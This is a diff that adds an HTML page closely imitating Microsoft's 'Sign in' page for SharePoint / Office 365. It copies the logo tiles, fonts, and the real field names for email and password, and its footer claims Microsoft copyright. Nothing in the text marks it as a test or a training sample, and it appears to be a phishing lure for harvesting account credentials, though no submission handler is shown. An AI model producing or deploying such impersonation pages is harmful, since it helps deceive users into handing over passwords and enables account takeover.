@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to your Microsoft account</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background-color: #eef2f5;
+    background-image: linear-gradient(135deg, #eef2f5 0%, #d8e2eb 100%);
+    color: #1b1b1b;
+    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+  }
+  .main-container {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+  }
+  .login-card {
+    background: #ffffff;
+    max-width: 440px;
+    width: 100%;
+    padding: 44px;
+    border-radius: 2px;
+    box-shadow: 0 4px 28px rgba(0, 0, 0, 0.1);
+  }
+  .ms-logo {
+    display: inline-grid;
+    grid-template-columns: 10px 10px;
+    gap: 2px;
+    margin-bottom: 20px;
+  }
+  .ms-tile { width: 10px; height: 10px; }
+  h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; }
+  .desc { font-size: 13px; color: #505050; margin-bottom: 20px; }
+  .field { margin-bottom: 16px; }
+  .field input {
+    width: 100%;
+    border: 1px solid #707070;
+    border-radius: 0;
+    padding: 10px 12px;
+    font-size: 15px;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  .field input:focus { border-color: #0067b8; }
+  .field-help { font-size: 13px; color: #1b1b1b; margin-bottom: 18px; }
+  .field-help a { color: #0067b8; text-decoration: none; }
+  .field-help a:hover { text-decoration: underline; }
+  .btn-next {
+    background: #0067b8;
+    color: #ffffff;
+    border: none;
+    padding: 8px 36px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    min-width: 108px;
+    height: 36px;
+    float: right;
+  }
+  .btn-next:hover { background: #005da6; }
+  .kmsi {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    color: #1b1b1b;
+    margin-bottom: 24px;
+  }
+  footer {
+    padding: 14px 24px;
+    display: flex;
+    justify-content: flex-end;
+    gap: 24px;
+    font-size: 12px;
+    color: #505050;
+  }
+  footer a { color: #505050; text-decoration: none; }
+  footer a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<div class="main-container">
+  <div class="login-card">
+    <div class="ms-logo">
+      <div class="ms-tile" style="background:#f25022;"></div>
+      <div class="ms-tile" style="background:#7fba00;"></div>
+      <div class="ms-tile" style="background:#00a4ef;"></div>
+      <div class="ms-tile" style="background:#ffb900;"></div>
+    </div>
+
+    <h1>Sign in</h1>
+    <p class="desc">to continue to <b>Microsoft SharePoint / Office 365</b></p>
+
+    <form id="ms-login-form">
+      <div class="field">
+        <input type="email" required placeholder="Email, phone, or Skype" name="loginfmt" autofocus>
+      </div>
+
+      <div class="field">
+        <input type="password" required placeholder="Password" name="passwd">
+      </div>
+
+      <div class="field-help">
+        No account? <a href="#">Create one!</a><br>
+        <a href="#">Can’t access your account?</a>
+      </div>
+
+      <label class="kmsi">
+        <input type="checkbox" checked>
+        <span>Keep me signed in</span>
+      </label>
+
+      <div style="overflow:hidden; margin-top:12px;">
+        <button type="submit" class="btn-next">Sign in</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<footer>
+  <a href="#">Terms of use</a>
+  <a href="#">Privacy & cookies</a>
+  <span>© 2026 Microsoft</span>
+</footer>
+
+</body>
+</html>
